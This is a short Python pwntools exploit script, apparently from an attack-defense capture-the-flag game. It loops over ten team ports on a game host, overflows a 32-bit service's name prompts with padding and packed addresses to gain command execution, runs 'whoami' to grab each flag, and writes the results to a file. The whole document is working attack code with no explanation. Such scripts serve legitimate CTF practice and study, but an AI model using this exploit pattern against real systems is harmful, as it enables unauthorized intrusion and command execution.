from pwn import *

def get_flag(host,port):
    
    context(arch='i386', bits=32, os='linux')
    a = remote(host,port)

    print a.recvuntil('Nama suami : ')
    a.sendline('a'*16 + p32(0x0804a010))

    print a.recvuntil('Nama istri : ')
    a.sendline(p32(0x08048598))


    a.sendline("whoami")
    dapat =  a.recvline()
    flag = dapat.strip()
    a.close()
    return flag
    
    
def loop_through():
    flags = []
    for team in range(1,11):
        # ganti disiniii
        if team >9:
            team_str = str(team)
        else:
            team_str = '0'+str(team)
        port = int("3"+team_str+"03")
        flag = get_flag("agrihack.party",port)
        flags.append(flag.strip())
    return flags

    

def start():
    flags = loop_through()
    count = 1
    file_out = open('out','w')
    for flag in flags:
        file_out.write(flag + ',' +str(count)+',3\n')
        count+=1
    
    
        
start()
